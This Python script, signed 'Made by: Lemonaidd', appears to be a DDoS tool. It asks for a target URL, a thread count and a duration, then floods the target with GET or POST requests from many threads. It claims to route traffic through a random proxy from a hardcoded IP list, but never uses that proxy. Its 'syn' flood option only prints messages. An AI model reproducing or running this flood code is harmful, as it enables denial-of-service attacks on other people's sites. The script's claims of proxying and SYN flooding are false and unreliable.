import threading
import os
import random
import requests
import time
from pystyle import Colors, Colorate, Center

COLOR_CODE = {
    "RESET": "\033[0m",
    "GREEN": "\033[32m",
    "RED": "\033[31m",
}

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

clear_console()
print(Colorate.Horizontal(Colors.green_to_white, "Made by: Lemonaidd"))
print(f'''{COLOR_CODE["GREEN"]} 
 ███▄ ▄███▓▓██   ██▓    ███▄    █ ▓█████▄▄▄█████▓
▓██▒▀█▀ ██▒ ▒██  ██▒    ██ ▀█   █ ▓█   ▀▓  ██▒ ▓▒
▓██    ▓██░  ▒██ ██░   ▓██  ▀█ ██▒▒███  ▒ ▓██░ ▒░
▒██    ▒██   ░ ▐██▓░   ▓██▒  ▐▌██▒▒▓█  ▄░ ▓██▓ ░ 
▒██▒   ░██▒  ░ ██▒▓░   ▒██░   ▓██░░▒████▒ ▒██▒ ░ 
░ ▒░   ░  ░   ██▒▒▒    ░ ▒░   ▒ ▒ ░░ ▒░ ░ ▒ ░░   
░  ░      ░ ▓██ ░▒░    ░ ░░   ░ ▒░ ░ ░  ░   ░    
░      ░    ▒ ▒ ░░        ░   ░ ░    ░    ░      
       ░    ░ ░                 ░    ░  ░        
            ░ ░                                  
''')










































































































































































PROXY_LIST = [
    "http://12.34.56.78:8080",
    "http://98.76.54.32:3128",
    "http://23.45.67.89:8000",
    "http://47.252.18.37:20",
    "http://152.53.194.46:8070",
    "http://43.130.57.74:3128",
    "http://96.93.124.209:31060",
    "http://73.162.84.19:8080",
    "http://98.114.204.51:3128",
    "http://174.58.152.133:8000",
    "http://67.180.13.24:80",
    "http://24.5.119.233:8888",
    "http://99.232.138.45:1080",
    "http://24.36.74.18:8080",
    "http://142.114.214.89:3128",
    "http://69.159.83.22:8000",
    "http://64.231.169.204:8888",
    "http://96.44.189.78:1080",
    "http://70.79.234.112:80",
    "http://99.245.161.33:8080",
    "http://24.114.122.57:3128",
    "http://174.91.63.144:8000",
    "http://65.94.182.200:8888",
    "http://24.141.176.21:1080",
    "http://174.95.217.10:8080",
    "http://50.71.89.27:3128",
    "http://184.151.36.248:80",
    "http://68.146.238.112:8000",
    "http://75.157.92.61:1080",
    "http://69.70.122.140:8888",
    "http://67.193.106.118:8080",
    "http://76.71.192.59:3128"
]

def connect_to_proxy():
    proxy = random.choice(PROXY_LIST)
    print(Colorate.Horizontal(Colors.green_to_white, "Connecting to proxy..."))
    time.sleep(2)
    print(Colorate.Horizontal(Colors.green_to_white, f"Connected to Proxy: {proxy}"))
    return {
        "http": proxy,
        "https": proxy
    }

def ddos_attack():
    link = input(Colorate.Horizontal(Colors.green_to_white, "Target URL: "))
    num_threads = int(input(Colorate.Horizontal(Colors.green_to_white, "Threads: ")))
    attack_method = input(Colorate.Horizontal(Colors.green_to_white, "Method (http / https / syn): ")).strip().lower()

    if attack_method in ["http", "https"]:
        request_type = input(Colorate.Horizontal(Colors.green_to_white, "Request type (GET / POST): ")).strip().upper()
        if request_type not in ["GET", "POST"]:
            print(f"{COLOR_CODE['RED']} Invalid request type. Use GET or POST. Stopping.{COLOR_CODE['RESET']}")
            return
    else:
        request_type = None

    attack_duration = int(input(Colorate.Horizontal(Colors.green_to_white, "Attack duration (in seconds): ")))

    proxy = connect_to_proxy()
    end_time = time.time() + attack_duration

    def send_request(session):
        while time.time() < end_time:
            try:
                if attack_method in ["http", "https"]:
                    if request_type == "POST":
                        session.post(link)
                        print(f"{COLOR_CODE['GREEN']} POST Request sent to: {link}{COLOR_CODE['RESET']}")
                    else:
                        session.get(link)
                        print(f"{COLOR_CODE['GREEN']} GET Request sent to: {link}{COLOR_CODE['RESET']}")
                elif attack_method == "syn":
                    print(f"{COLOR_CODE['GREEN']} SYN flood to: {link}{COLOR_CODE['RESET']}")
                    time.sleep(0.5)
                else:
                    print(f"{COLOR_CODE['RED']}Invalid method. Stopping.{COLOR_CODE['RESET']}")
                    break
            except requests.RequestException:
                print(f"{COLOR_CODE['RED']} ERROR sending to {link}{COLOR_CODE['RESET']}")

    threads = []
    for _ in range(num_threads):
        session = requests.Session()
        thread = threading.Thread(target=send_request, args=(session,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(Colorate.Horizontal(Colors.green_to_white, "\nAttack Stopped"))

if __name__ == "__main__":
    ddos_attack()
